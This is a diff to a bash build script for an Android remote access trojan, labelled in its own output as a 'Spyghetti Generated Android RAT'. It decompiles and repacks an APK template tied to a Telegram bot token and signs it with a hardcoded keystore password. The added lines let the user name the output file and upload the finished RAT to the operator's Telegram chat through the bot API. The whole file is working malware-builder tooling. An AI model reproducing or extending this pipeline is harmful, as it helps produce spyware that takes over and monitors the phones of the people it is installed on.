@@ -12,7 +12,7 @@ clear
 #install function
 install(){
 #add execute permission to files
-FILES=( "./Tools/zipalign" "./Tools/zipalign-m")
+FILES=( "./Tools/zipalign" "./Tools/zipalign-m" "./main")
 
 for FILE in  "${FILES[@]}";do
     if chmod +x "${FILE}" > /dev/null 2>&1;then
@@ -79,6 +79,9 @@ TOKEN=""
 stty -echo
 
 
+
+
+
 while IFS= read -r -s -n 1 char; do
     # If Enter is pressed, break
     if [[ $char == $'\0' || $char == $'\n' ]]; then
@@ -102,6 +105,10 @@ stty echo
 
 # Move to new line
 echo
+
+#collect output name
+echo -e "${GREEN}Enter Output Name [without extension]:${NC}"
+read outputname
 
 #verify bot
 BOT_USERNAME=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe"|jq '.result.username')
@@ -161,7 +168,7 @@ else
 fi
 
 #recompile
-if outputRecompile=$(java -jar ./Tools/apktool_2.11.1.jar b Decompiled/ -o ./tempFolder/myApp-unsigned.apk 2>&1);then
+if outputRecompile=$(java -jar ./Tools/apktool_2.11.1.jar b Decompiled/ -o ./tempFolder/$outputname-unsigned.apk 2>&1);then
     #echo verbose
     if $verbose; then
         echo -e "${YELLOW}$outputRecompile${NC}"
@@ -184,47 +191,58 @@ else
   zipalign=./Tools/zipalign-m
 fi
 
-if outputZipalign=$($zipalign -p -f 4 ./tempFolder/myApp-unsigned.apk ./tempFolder/myApp-aligned.apk 2>&1);then
+if outputZipalign=$($zipalign -p -f 4 ./tempFolder/$outputname-unsigned.apk ./tempFolder/$outputname-aligned.apk 2>&1);then
 #echo verbose
     if $verbose; then
         echo -e "${YELLOW}$outputZipalign${NC}"
     fi
-    echo -e "${GREEN}[+]Aligned app  : ./tempFolder/myApp-unsigned.apk$NC"
+    echo -e "${GREEN}[+]Aligned app  : ./tempFolder/$outputname-unsigned.apk$NC"
 
 else
     #echo verbose
     if $verbose; then
         echo -e "${RED}$outputZipalign${NC}"
     fi
-    echo -e "${RED}[X]Failed to Align App : ./tempFolder/myApp-unsigned.apk$NC"
+    echo -e "${RED}[X]Failed to Align App : ./tempFolder/$outputname-unsigned.apk$NC"
 fi
 
 #sign apk
-if outputApksigner=$(java -jar ./Tools/apksigner.jar sign   --ks ./Base/key.jks   --ks-key-alias key0   --ks-pass pass:11111111   --key-pass pass:11111111   --out myApp-final.apk   ./tempFolder/myApp-aligned.apk 2>&1);then
+if outputApksigner=$(java -jar ./Tools/apksigner.jar sign   --ks ./Base/key.jks   --ks-key-alias key0   --ks-pass pass:11111111   --key-pass pass:11111111   --out $outputname.apk   ./tempFolder/$outputname-aligned.apk 2>&1);then
     #echo verbose
     if $verbose; then
         echo -e "${YELLOW}$outputApksigner${NC}"
     fi
-    echo -e "${GREEN}[+]Signed App  : ./tempFolder/myApp-aligned.apk$NC"
+    echo -e "${GREEN}[+]Signed App  : ./tempFolder/$outputname-aligned.apk$NC"
 
 else
     #echo verbose
     if $verbose; then
         echo -e "${RED}$outputApksigner${NC}"
     fi
-    echo -e "${RED}[X]Failed to Sign App : ./tempFolder/myApp-aligned.apk$NC"
+    echo -e "${RED}[X]Failed to Sign App : ./tempFolder/$outputname-aligned.apk$NC"
 fi
 
 #remove temp files
 rm  Decompiled/ -r
 rm  tempFolder/ -r
-rm  myApp-final.apk.idsig 
+rm  $outputname.apk.idsig 
 echo -e "${GREEN}[+]Cleared Temp files$NC"
 
 #verify Signature
-java -jar ./Tools/apksigner.jar verify myApp-final.apk && echo -e "${YELLOW}✔ Signature OK $NC"
+java -jar ./Tools/apksigner.jar verify $outputname.apk && echo -e "${YELLOW}✔ Signature OK $NC"
 
-dir=$(pwd)/myApp-final.apk
+dir=$(pwd)/$outputname.apk
 echo -e "${YELLOW}Generated App Located at : $dir $NC"
 
 
+# #send apk to telegram
+echo -e "${GREEN}Sending APK to telegram$NC"
+if uploadToTelegram=$(curl -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id="$LAST_CHAT_ID" -F document=@"$outputname.apk" -F caption="Hi ${LAST_USER},Here is your Spyghetti Generated Android RAT")2>&1;then
+    echo -e "${GREEN}APK Successfully Sent to Telegram$NC"
+else
+    #echo verbose
+    if $verbose; then
+        echo -e "${RED}$uploadToTelegram${NC}"
+    fi
+    echo -e "${RED}[X]Failed to Sent $outputname.apk to Telegram $NC"
+fi
